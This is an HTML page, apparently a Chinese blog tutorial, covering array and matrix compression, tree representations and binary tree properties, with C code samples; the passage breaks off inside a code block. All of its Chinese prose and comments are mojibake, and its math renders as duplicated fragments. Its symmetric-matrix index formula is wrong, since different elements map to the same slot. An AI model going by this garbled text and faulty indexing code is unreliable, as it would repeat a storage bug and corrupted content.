class="hljs-number">4</span>&#125;,<br>        &#123;<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;,<br>        &#123;<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>&#125;<br>    &#125;,<br>    &#123;<br>        &#123;<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>&#125;,<br>        &#123;<span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>&#125;,<br>        &#123;<span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>&#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>è®¿é—®ä¸‰ç»´æ•°ç»„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> value = array3D[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]; <span class="hljs-comment">// è·å–ç¬¬äºŒä¸ª2Dæ•°ç»„çš„ç¬¬ä¸‰è¡Œç¬¬å››åˆ—çš„å…ƒç´ </span><br></code></pre></td></tr></table></figure><h3 id="çŸ©é˜µçš„å‹ç¼©å­˜å‚¨"><a href="#çŸ©é˜µçš„å‹ç¼©å­˜å‚¨" class="headerlink" title="çŸ©é˜µçš„å‹ç¼©å­˜å‚¨"></a>çŸ©é˜µçš„å‹ç¼©å­˜å‚¨</h3><p>çŸ©é˜µå‹ç¼©å­˜å‚¨ç”¨äºèŠ‚çœç©ºé—´ï¼Œç‰¹åˆ«æ˜¯åœ¨çŸ©é˜µå…·æœ‰æŸç§ç‰¹æ®Šç»“æ„æ—¶ï¼Œä¾‹å¦‚å¯¹ç§°çŸ©é˜µã€ä¸‰è§’çŸ©é˜µå’Œç¨€ç–çŸ©é˜µã€‚</p><h4 id="å¯¹ç§°çŸ©é˜µ"><a href="#å¯¹ç§°çŸ©é˜µ" class="headerlink" title="å¯¹ç§°çŸ©é˜µ"></a>å¯¹ç§°çŸ©é˜µ</h4><p>å¯¹ç§°çŸ©é˜µæ˜¯æŒ‡çŸ©é˜µçš„å…ƒç´ æ»¡è¶³ <code>A[i][j] == A[j][i]</code>ã€‚å¯¹äºå¯¹ç§°çŸ©é˜µï¼Œåªéœ€è¦å­˜å‚¨çŸ©é˜µçš„ä¸Šä¸‰è§’æˆ–ä¸‹ä¸‰è§’éƒ¨åˆ†å³å¯ã€‚</p><p>å‡è®¾å­˜å‚¨ä¸Šä¸‰è§’éƒ¨åˆ†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> n = <span class="hljs-number">3</span>; <span class="hljs-comment">// çŸ©é˜µçš„ç»´åº¦</span><br><span class="hljs-type">int</span> symmetricMatrix[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>]; <span class="hljs-comment">// å­˜å‚¨ä¸Šä¸‰è§’éƒ¨åˆ†çš„æ•°ç»„</span><br><br><span class="hljs-comment">// è®¡ç®—ç´¢å¼•</span><br><span class="hljs-type">int</span> index = (i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j;<br>symmetricMatrix[index] = value;<br></code></pre></td></tr></table></figure><p>è®¿é—®å…ƒç´ æ—¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">getSymmetricMatrixValue</span><span class="hljs-params">(<span class="hljs-type">int</span>* mat, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>    <span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>        <span class="hljs-keyword">return</span> mat[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> mat[(j * (j + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¸‰è§’çŸ©é˜µ"><a href="#ä¸‰è§’çŸ©é˜µ" class="headerlink" title="ä¸‰è§’çŸ©é˜µ"></a>ä¸‰è§’çŸ©é˜µ</h4><ul><li><strong>ä¸Šä¸‰è§’çŸ©é˜µ</strong>ï¼šåªå­˜å‚¨éé›¶çš„ä¸Šä¸‰è§’éƒ¨åˆ†ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> upperTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>å­˜å‚¨ä¸Šä¸‰è§’çŸ©é˜µçš„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &lt;= j) &#123;<br>    upperTriangular[(i * n) - (i * (i - <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + (j - i)] = value;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><strong>ä¸‹ä¸‰è§’çŸ©é˜µ</strong>ï¼šåªå­˜å‚¨éé›¶çš„ä¸‹ä¸‰è§’éƒ¨åˆ†ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> lowerTriangular[(n * (n + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span>];<br></code></pre></td></tr></table></figure><p>å­˜å‚¨ä¸‹ä¸‰è§’çŸ©é˜µçš„å…ƒç´ ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (i &gt;= j) &#123;<br>    lowerTriangular[(i * (i + <span class="hljs-number">1</span>)) / <span class="hljs-number">2</span> + j] = value;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç¨€ç–çŸ©é˜µå‹ç¼©å­˜å‚¨"><a href="#ç¨€ç–çŸ©é˜µå‹ç¼©å­˜å‚¨" class="headerlink" title="ç¨€ç–çŸ©é˜µå‹ç¼©å­˜å‚¨"></a>ç¨€ç–çŸ©é˜µå‹ç¼©å­˜å‚¨</h4><p>ç¨€ç–çŸ©é˜µæ˜¯æŒ‡å¤§éƒ¨åˆ†å…ƒç´ ä¸ºé›¶çš„çŸ©é˜µã€‚ç¨€ç–çŸ©é˜µå¯ä»¥é€šè¿‡ä¸‰å…ƒç»„ï¼ˆè¡Œã€åˆ—ã€å€¼ï¼‰æ¥å‹ç¼©å­˜å‚¨ã€‚å¸¸è§çš„å­˜å‚¨æ–¹æ³•åŒ…æ‹¬COOï¼ˆCoordinate Listï¼‰ã€CSRï¼ˆCompressed Sparse Rowï¼‰å’ŒCSCï¼ˆCompressed Sparse Columnï¼‰ã€‚</p><ul><li><strong>COOï¼ˆCoordinate Listï¼‰</strong>ï¼šä½¿ç”¨ä¸‰ä¸ªæ•°ç»„åˆ†åˆ«å­˜å‚¨éé›¶å…ƒç´ çš„è¡Œç´¢å¼•ã€åˆ—ç´¢å¼•å’Œå¯¹åº”çš„å€¼ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> row[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> val[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSRï¼ˆCompressed Sparse Rowï¼‰</strong>ï¼šä½¿ç”¨ä¸‰ä¸ªæ•°ç»„å­˜å‚¨ç¨€ç–çŸ©é˜µï¼Œåˆ†åˆ«æ˜¯ <code>values</code>ï¼ˆéé›¶å…ƒç´ çš„å€¼ï¼‰ï¼Œ<code>col_index</code>ï¼ˆéé›¶å…ƒç´ æ‰€åœ¨çš„åˆ—ç´¢å¼•ï¼‰å’Œ <code>row_pointer</code>ï¼ˆæ¯è¡Œå¼€å§‹çš„ä½ç½®ï¼‰ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> col_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;<br><span class="hljs-type">int</span> row_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>CSCï¼ˆCompressed Sparse Columnï¼‰</strong>ï¼šä¸CSRç±»ä¼¼ï¼Œä½¿ç”¨ä¸‰ä¸ªæ•°ç»„å­˜å‚¨ç¨€ç–çŸ©é˜µï¼Œåªä¸è¿‡æ˜¯æŒ‰åˆ—è¿›è¡Œå­˜å‚¨ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> values[] = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">30</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>&#125;;<br><span class="hljs-type">int</span> row_index[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> col_pointer[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™äº›å‹ç¼©å­˜å‚¨æ–¹æ³•é€šè¿‡åªå­˜å‚¨éé›¶å…ƒç´ å’Œå®ƒä»¬çš„ä½ç½®ï¼Œå¤§å¤§å‡å°‘äº†ç¨€ç–çŸ©é˜µæ‰€éœ€çš„å­˜å‚¨ç©ºé—´ã€‚</p><h2 id="æ ‘"><a href="#æ ‘" class="headerlink" title="æ ‘"></a>æ ‘</h2><p>æ ‘çš„å­˜å‚¨ç»“æ„ä¸»è¦æœ‰ä¸‰ç§ï¼š<strong>åŒäº²è¡¨ç¤ºæ³•</strong>ã€<strong>å­©å­è¡¨ç¤ºæ³•</strong>å’Œ<strong>å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•</strong></p><pre><code class="hljs">     A   / | \  B  C  D / \    |E   F   G</code></pre><p>åŒäº²è¡¨ç¤ºæ³•â€”-é€‚åˆæŸ¥æ‰¾èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œä½†æ˜¯åœ¨æŸ¥æ‰¾å­©å­èŠ‚ç‚¹æ—¶æ•ˆç‡è¾ƒä½</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data; <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„å€¼</span><br>    <span class="hljs-type">int</span> parent;       <span class="hljs-comment">// å­˜å‚¨çˆ¶èŠ‚ç‚¹çš„ç´¢å¼•ï¼ˆè‹¥æ˜¯æ ¹èŠ‚ç‚¹ï¼Œçˆ¶èŠ‚ç‚¹è®¾ä¸º-1ï¼‰</span><br>&#125; PTNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    PTNode nodes[MAX_SIZE]; <span class="hljs-comment">// å­˜å‚¨èŠ‚ç‚¹çš„æ•°ç»„</span><br>    <span class="hljs-type">int</span> n;                  <span class="hljs-comment">// æ ‘ä¸­èŠ‚ç‚¹çš„æ•°é‡</span><br>&#125; PTree;<br><br></code></pre></td></tr></table></figure><p>åœ¨åŒäº²è¡¨ç¤ºæ³•ä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹è®°å½•è‡ªå·±çš„çˆ¶èŠ‚ç‚¹ç´¢å¼•ï¼š</p><table><thead><tr><th>ç´¢å¼•</th><th>æ•°æ®</th><th>çˆ¶èŠ‚ç‚¹ç´¢å¼•</th></tr></thead><tbody><tr><td>0</td><td>A</td><td>-1</td></tr><tr><td>1</td><td>B</td><td>0</td></tr><tr><td>2</td><td>C</td><td>0</td></tr><tr><td>3</td><td>D</td><td>0</td></tr><tr><td>4</td><td>E</td><td>1</td></tr><tr><td>5</td><td>F</td><td>1</td></tr><tr><td>6</td><td>G</td><td>3</td></tr></tbody></table><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œâ€œAâ€èŠ‚ç‚¹æ˜¯æ ¹èŠ‚ç‚¹ï¼Œå› æ­¤å®ƒçš„çˆ¶èŠ‚ç‚¹ç´¢å¼•ä¸º <code>-1</code>ã€‚æ¯ä¸ªèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ç´¢å¼•æŒ‡å‘å®ƒåœ¨æ•°ç»„ä¸­çš„ä½ç½®ã€‚</p><p>å­©å­è¡¨ç¤ºæ³•â€”-é€‚åˆæŸ¥æ‰¾èŠ‚ç‚¹çš„å­©å­ï¼Œå°¤å…¶æ˜¯æ ‘çš„åº¦è¾ƒå¤§æ—¶</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> ChildNode &#123;<br>    <span class="hljs-type">int</span> child;                <span class="hljs-comment">// æŒ‡å‘å­©å­èŠ‚ç‚¹çš„ç´¢å¼•</span><br>    <span class="hljs-keyword">struct</span> ChildNode *next;   <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªå­©å­èŠ‚ç‚¹</span><br>&#125; ChildNode;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    ElementType data;        <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„å€¼</span><br>    ChildNode *firstChild;   <span class="hljs-comment">// å­©å­é“¾è¡¨çš„å¤´æŒ‡é’ˆ</span><br>&#125; <span class="hljs-built_in">CTNode</span>;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    <span class="hljs-built_in">CTNode</span> nodes[MAX_SIZE]; <span class="hljs-comment">// èŠ‚ç‚¹æ•°ç»„</span><br>    <span class="hljs-type">int</span> n;                  <span class="hljs-comment">// æ ‘ä¸­èŠ‚ç‚¹çš„æ•°é‡</span><br>&#125; <span class="hljs-built_in">CTree</span>;<br><br></code></pre></td></tr></table></figure><p><strong>A</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ B â†’ C â†’ D</p><p><strong>B</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ E â†’ F</p><p><strong>C</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ (ç©º)</p><p><strong>D</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ G</p><p><strong>E</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ (ç©º)</p><p><strong>F</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ (ç©º)</p><p><strong>G</strong> â†’ <strong>å­©å­é“¾è¡¨</strong> â†’ (ç©º)</p><p>å­©å­å…„å¼Ÿè¡¨ç¤ºæ³•â€”-é€‚åˆåŒæ—¶æŸ¥æ‰¾å­©å­å’Œå…„å¼ŸèŠ‚ç‚¹ã€‚æ­¤ç»“æ„å°†å¤šå‰æ ‘è½¬æ¢ä¸ºäºŒå‰æ ‘ï¼Œæœ‰åˆ©äºåœ¨å®é™…ä¸­ä½¿ç”¨äºŒå‰æ ‘çš„ç®—æ³•æ¥å¤„ç†å¤šå‰æ ‘</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss">typedef <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> &#123;<br>    ElementType data;         <span class="hljs-comment">// æ•°æ®åŸŸï¼Œå­˜å‚¨èŠ‚ç‚¹çš„å€¼</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> *firstChild; <span class="hljs-comment">// å·¦å­©å­æŒ‡é’ˆï¼ŒæŒ‡å‘ç¬¬ä¸€ä¸ªå­©å­èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">CSNode</span> *nextSibling; <span class="hljs-comment">// å³å…„å¼ŸæŒ‡é’ˆï¼ŒæŒ‡å‘å³å…„å¼ŸèŠ‚ç‚¹</span><br>&#125; CSNode, *CSTree;<br><br></code></pre></td></tr></table></figure><p><strong>A</strong> â†’ <strong>firstChild</strong> â†’ B</p><p><strong>B</strong> â†’ <strong>firstChild</strong> â†’ E, <strong>nextSibling</strong> â†’ C</p><p><strong>C</strong> â†’ <strong>nextSibling</strong> â†’ D</p><p><strong>D</strong> â†’ <strong>firstChild</strong> â†’ G</p><p><strong>E</strong> â†’ <strong>nextSibling</strong> â†’ F</p><p><strong>F</strong> â†’ <strong>nextSibling</strong> â†’ (ç©º)</p><p><strong>G</strong> â†’ <strong>nextSibling</strong> â†’ (ç©º)</p><h2 id="äºŒå‰æ ‘"><a href="#äºŒå‰æ ‘" class="headerlink" title="äºŒå‰æ ‘"></a>äºŒå‰æ ‘</h2><p>èŠ‚ç‚¹æ•°çš„æ€§è´¨</p><ul><li><strong>æ€§è´¨ 1</strong>ï¼šå¯¹ä»»ä½•ä¸€æ£µéç©ºäºŒå‰æ ‘ï¼Œç¬¬ iii å±‚ä¸Šçš„<strong>æœ€å¤šèŠ‚ç‚¹æ•°</strong>ä¸º 2iâˆ’12^{i-1}2iâˆ’1ï¼ˆiâ‰¥1i \geq 1iâ‰¥1ï¼‰ã€‚<ul><li>ä¾‹å¦‚ï¼Œç¬¬ 1 å±‚æœ€å¤šæœ‰ 21âˆ’1&#x3D;12^{1-1} &#x3D; 121âˆ’1&#x3D;1 ä¸ªèŠ‚ç‚¹ï¼Œç¬¬ 2 å±‚æœ€å¤šæœ‰ 22âˆ’1&#x3D;22^{2-1} &#x3D; 222âˆ’1&#x3D;2 ä¸ªèŠ‚ç‚¹ï¼Œç¬¬ 3 å±‚æœ€å¤šæœ‰ 23âˆ’1&#x3D;42^{3-1} &#x3D; 423âˆ’1&#x3D;4 ä¸ªèŠ‚ç‚¹ï¼Œä¾æ­¤ç±»æ¨ã€‚</li></ul></li><li><strong>æ€§è´¨ 2</strong>ï¼šæ·±åº¦ä¸º kkk çš„äºŒå‰æ ‘çš„<strong>æœ€å¤šèŠ‚ç‚¹æ•°</strong>ä¸º 2kâˆ’12^k - 12kâˆ’1ï¼ˆkâ‰¥1k \geq 1kâ‰¥1ï¼‰ã€‚<ul><li>ä¾‹å¦‚ï¼Œæ·±åº¦ä¸º 3 çš„äºŒå‰æ ‘æœ€å¤šæœ‰ 23âˆ’1&#x3D;72^3 - 1 &#x3D; 723âˆ’1&#x3D;7 ä¸ªèŠ‚ç‚¹ã€‚</li></ul></li><li><strong>æ€§è´¨ 3</strong>ï¼šå¯¹ä»»ä½•ä¸€æ£µäºŒå‰æ ‘ï¼Œè‹¥å…¶å¶èŠ‚ç‚¹æ•°ä¸º n0n_0n0ï¼Œåº¦ä¸º 2 çš„èŠ‚ç‚¹æ•°ä¸º n2n_2n2ï¼Œåˆ™æ»¡è¶³å…³ç³»å¼ï¼šn0&#x3D;n2+1n_0 &#x3D; n_2 + 1n0&#x3D;n2+1ã€‚<ul><li>è¿™ä¸ªæ€§è´¨å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿè®¡ç®—ä¸€æ£µäºŒå‰æ ‘çš„å¶èŠ‚ç‚¹å’Œåº¦ä¸º 2 çš„èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»ã€‚</li></ul></li></ul><hr><p> å®Œå…¨äºŒå‰æ ‘çš„æ€§è´¨</p><ul><li><strong>æ€§è´¨ 4</strong>ï¼šå¦‚æœä¸€æ£µ<strong>å®Œå…¨äºŒå‰æ ‘</strong>æœ‰ nnn ä¸ªèŠ‚ç‚¹ï¼Œåˆ™è¿™äº›èŠ‚ç‚¹å¯ä»¥ä»ä¸Šè‡³ä¸‹ã€ä»å·¦åˆ°å³ç¼–å·ä¸º 1 åˆ° nnnã€‚å¯¹äºä»»æ„èŠ‚ç‚¹ iiiï¼ˆ1 â‰¤ iii â‰¤ nnnï¼‰ï¼š<ul><li>è‹¥ i&#x3D;1i &#x3D; 1i&#x3D;1ï¼Œåˆ™èŠ‚ç‚¹ iii æ˜¯æ ¹èŠ‚ç‚¹ã€‚</li><li>è‹¥ i&gt;1i &gt; 1i&gt;1ï¼Œåˆ™èŠ‚ç‚¹ iii çš„<strong>çˆ¶èŠ‚ç‚¹</strong>ç¼–å·ä¸º âŒŠi&#x2F;2âŒ‹\lfloor i&#x2F;2 \rfloorâŒŠi&#x2F;2âŒ‹ã€‚</li><li>è‹¥ 2iâ‰¤n2i \leq n2iâ‰¤nï¼Œåˆ™èŠ‚ç‚¹ iii çš„<strong>å·¦å­©å­</strong>ç¼–å·ä¸º 2i2i2iã€‚</li><li>è‹¥ 2i+1â‰¤n2i + 1 \leq n2i+1â‰¤nï¼Œåˆ™èŠ‚ç‚¹ iii çš„<strong>å³å­©å­</strong>ç¼–å·ä¸º 2i+12i + 12i+1ã€‚</li></ul></li></ul><hr><p> äºŒå‰æ ‘çš„æ·±åº¦å’Œé«˜åº¦å…³ç³»</p><ul><li><strong>æ€§è´¨ 5</strong>ï¼šå¯¹äºä¸€æ£µæœ‰ nnn ä¸ªèŠ‚ç‚¹çš„å®Œå…¨äºŒå‰æ ‘ï¼Œå…¶<strong>æ·±åº¦ï¼ˆæˆ–é«˜åº¦ï¼‰</strong>ä¸º âŒŠlogâ¡2nâŒ‹+1\lfloor \log_2 n \rfloor + 1âŒŠlog2nâŒ‹+1ã€‚<ul><li>ä¾‹å¦‚ï¼Œä¸€æ£µæœ‰ 7 ä¸ªèŠ‚ç‚¹çš„å®Œå…¨äºŒå‰æ ‘çš„æ·±åº¦ä¸º âŒŠlogâ¡27âŒ‹+1&#x3D;3\lfloor \log_2 7 \rfloor + 1 &#x3D; 3âŒŠlog27âŒ‹+1&#x3D;3ã€‚</li></ul></li></ul><hr><p>æ»¡äºŒå‰æ ‘çš„æ€§è´¨</p><ul><li><strong>æ€§è´¨ 6</strong>ï¼šä¸€æ£µæ·±åº¦ä¸º kkk çš„<strong>æ»¡äºŒå‰æ ‘</strong>çš„èŠ‚ç‚¹æ•°ä¸º 2kâˆ’12^k - 12kâˆ’1ã€‚<ul><li>æ»¡äºŒå‰æ ‘æŒ‡çš„æ˜¯æ¯ä¸€å±‚éƒ½è¢«å®Œå…¨å¡«æ»¡çš„äºŒå‰æ ‘ï¼Œæ²¡æœ‰ç©ºç¼ºã€‚</li></ul></li><li><strong>æ€§è´¨ 7</strong>ï¼šæ»¡äºŒå‰æ ‘çš„<strong>å¶èŠ‚ç‚¹æ•°</strong>ç­‰äºåº¦ä¸º 2 çš„èŠ‚ç‚¹æ•°åŠ  1ï¼Œä¸”æ‰€æœ‰çš„å¶èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ã€‚</li></ul><hr><p> äºŒå‰æ ‘çš„èŠ‚ç‚¹ä¹‹é—´çš„å…³ç³»</p><ul><li><strong>æ€§è´¨ 8</strong>ï¼šåœ¨äºŒå‰æ ‘çš„é¡ºåºå­˜å‚¨ä¸­ï¼Œçˆ¶èŠ‚ç‚¹ã€å·¦å­©å­å’Œå³å­©å­ä¹‹é—´çš„ç´¢å¼•å…³ç³»å¯ä»¥ç®€åŒ–æ“ä½œï¼š<ul><li>å¦‚æœæŸèŠ‚ç‚¹çš„ç´¢å¼•ä¸º iiiï¼Œåˆ™å…¶å·¦å­©å­çš„ç´¢å¼•ä¸º 2i2i2iï¼Œå³å­©å­çš„ç´¢å¼•ä¸º 2i+12i + 12i+1ï¼Œçˆ¶èŠ‚ç‚¹çš„ç´¢å¼•ä¸º âŒŠi&#x2F;2âŒ‹\lfloor i&#x2F;2 \rfloorâŒŠi&#x2F;2âŒ‹ã€‚</li></ul></li><li><strong>æ€§è´¨ 9</strong>ï¼šåœ¨äºŒå‰æ ‘ä¸­ï¼Œæ·±åº¦è¶Šå¤§çš„å±‚ï¼Œå…¶èŠ‚ç‚¹æ•°å‘ˆæŒ‡æ•°å¢é•¿ã€‚å³åœ¨äºŒå‰æ ‘çš„æœ«ç«¯å±‚èŠ‚ç‚¹æ•°æœ€å¤šï¼Œè€Œæ ¹èŠ‚ç‚¹åªæœ‰ä¸€ä¸ªã€‚</li></ul><p>äºŒå‰æ ‘é¡ºåºå­˜å‚¨</p><pre><code class="hljs">     A   /   \  B     C / \   / \D   E F   G</code></pre><p>æŒ‰ç…§é¡ºåºå­˜å‚¨çš„æ–¹å¼ï¼Œè¿™æ£µæ ‘ä¼šè¢«å­˜å‚¨åœ¨æ•°ç»„ä¸­å¦‚ä¸‹ï¼š</p><table><thead><tr><th>ç´¢å¼•</th><th>æ•°æ®</th></tr></thead><tbody><tr><td>1</td><td>A</td></tr><tr><td>2</td><td>B</td></tr><tr><td>3</td><td>C</td></tr><tr><td>4</td><td>D</td></tr><tr><td>5</td><td>E</td></tr><tr><td>6</td><td>F</td></tr><tr><td>7</td><td>G</td></tr></tbody></table><p>åœ¨è¿™ä¸ªæ•°ç»„ä¸­ï¼š</p><ul><li>A çš„å·¦å­©å­æ˜¯ Bï¼ˆç´¢å¼• 2ï¼‰ï¼Œå³å­©å­æ˜¯ Cï¼ˆç´¢å¼• 3ï¼‰ã€‚</li><li>B çš„å·¦å­©å­æ˜¯ Dï¼ˆç´¢å¼• 4ï¼‰ï¼Œå³å­©å­æ˜¯ Eï¼ˆç´¢å¼• 5ï¼‰ã€‚</li><li>C çš„å·¦å­©å­æ˜¯ Fï¼ˆç´¢å¼• 6ï¼‰ï¼Œå³å­©å­æ˜¯ Gï¼ˆç´¢å¼• 7ï¼‰ã€‚</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span 